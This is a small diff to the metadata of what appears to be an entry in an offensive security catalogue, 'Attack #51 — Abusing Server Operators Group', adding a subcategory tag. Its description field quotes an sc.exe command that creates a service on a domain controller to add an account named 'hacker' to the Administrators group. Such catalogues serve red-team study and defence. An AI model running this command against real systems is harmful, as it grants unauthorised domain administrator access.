@@ -2,6 +2,7 @@
 title: "Attack #51 — Abusing Server Operators Group"
 description: "sc.exe \\\\DC01 create evilsvc binPath= \"cmd.exe /c net user hacker P@ss123! /add && net localgroup Administrators hacker /add\" start= auto sc.exe \\\\DC01…"
 category: active-directory
+subcategory: "Privilege & Group Abuse"
 tags: ["active-directory", "adcs"]
 tools: ["PowerShell"]
 difficulty: advanced
